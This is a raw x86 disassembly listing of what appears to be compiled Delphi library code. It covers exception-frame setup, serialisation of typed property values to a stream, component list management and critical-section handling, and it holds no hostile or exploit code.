mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40411c
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_404238
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f2c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_403f0c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414bd0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41fe3c
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41f0e0
jmp r-xdata
sub_420170
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_42022d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415580
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d32c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420aec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420234
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_4057b4
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41fe3c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41f0e0
sub_42024c
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4202e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4154a4
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_4033fc
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_40411c
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f0e0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420aec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202ee
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_4202f4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_42034d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415424
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4204a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420354
lea eax [ ebp - 0x10 ]
call sub_40f018
retn
sub_420358
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_420b00
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f928
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f38c
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414bd0
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420416 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414bd0
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41fc88
pop ecx
jmp r-xdata
push ebp
call sub_41fd48
pop ecx
jmp r-xdata
push ebp
call sub_41fdc4
pop ecx
jmp r-xdata
push ebp
call sub_41ff64
pop ecx
jmp r-xdata
push ebp
call sub_42024c
pop ecx
jmp r-xdata
push ebp
call sub_4202f4
pop ecx
jmp r-xdata
push ebp
call sub_41fd88
pop ecx
jmp r-xdata
push ebp
call sub_420170
pop ecx
sub_4204a4
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_420880
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414220
test al al
je r-xdata
mov eax ebx
call sub_4140b8
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_41130c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f0bc
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f9bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f1a4
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412a44
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420a38
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420887
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0x34 ]
call sub_4057b4
lea eax [ ebp - 0x30 ]
call sub_403eb8
lea eax [ ebp - 0x2c ]
call sub_4045c4
lea eax [ ebp - 0x1c ]
call sub_4057b4
retn
xor eax eax
push ebp
push sub_420824
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_414518
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420522 ]
mov eax ebx
call sub_410480
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41f218
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410dc4
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_41231c
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4209e4
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_4057b4
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_41301c
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d32c
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420aec
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420aec
jmp r-xdata
mov eax ebx
call sub_41130c
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f074
jmp r-xdata
mov eax ebx
call sub_41130c
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f050
jmp r-xdata
mov eax ebx
call sub_411c68
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f098
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_41231c
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4209e4
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420aec
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420aec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420813
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b860
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4207b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403078
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_40411c
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_4209e4
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e894
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207c0
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_4207c0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420aec
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e894
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_4208a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4208e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_4041c4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208ed
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_420904
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404178
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e894
mov eax esi
call sub_404378
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e894
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_42094c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042c4
je r-xdata
mov eax esi
call sub_404178
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404178
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e894
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e894
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e894
mov dl 0x6
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e894
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e894
sub_4209e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420a29
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c28
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42094c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a30
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_420a38
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420ade
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405ad8
mov eax [ ebp - 0x8 ]
call sub_404178
mov edi eax
mov eax ebx
call sub_404730
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420aec
mov eax ebx
call sub_404730
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
call sub_41e894
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e894
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404140
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_42094c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420ae5
lea eax [ ebp - 0xc ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_420b00
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_420b98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
call sub_420b70
mov eax ebx
call sub_420b7c
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420d26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420d07
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420d0e
mov eax [ ebp - 0xc ]
call sub_403128
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418700
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4185f0
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_420cd1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_420ca2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420d38
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_420ef0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_420d84
push ebx
push esi
push ecx
call sub_4034f4
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_420fd8
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_420f80
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418ce8
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420f48
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4034dc
lea eax [ ebx + 0x14 ]
call sub_40d31c
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418700
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_420e08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41875c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4185a4
mov edx ebx
mov eax esi
call sub_420e08
sub_420e9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4185a4
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x10 ] eax
sub_420ec8
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41889c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403128
xor eax eax
mov [ ebx + 0x10 ] eax
sub_420ef0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403324
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_420e9c
mov dl 0x1
mov eax ebx
call sub_421410
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4213c0
sub_420f48
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_421410
mov edx ebx
mov eax esi
call sub_420ec8
pop edi
pop esi
pop ebx
retn
sub_420f80
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4187e8
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420f48
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_420ec8
sub_420fd8
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418700
call sub_420fd8
inc edi
dec esi
jne r-xdata
sub_421014
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41889c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403128
xor eax eax
mov [ ebx + 0x14 ] eax
sub_421038
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421014
mov edx ebx
mov eax esi
call sub_421014
pop esi
pop ebx
retn
sub_421054
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_421038
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418700
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4210b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420e5c
push ebx
push sub_420e84
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_420e70
push ebx
push sub_420e90
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4211a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407e74
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_421240
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
sub_421240
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418700
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407e74
test al al
jne r-xdata
sub_421290
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042c4
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407ff8
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
xor edx edx
mov eax ebx
call sub_421410
mov edx esi
mov eax ebx
call sub_42131c
mov dl 0x1
mov eax ebx
call sub_421410
sub_421330
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418700
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41868c
sub_42136c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_41875c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4185f0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41877c
sub_4213c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_42135c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_421330
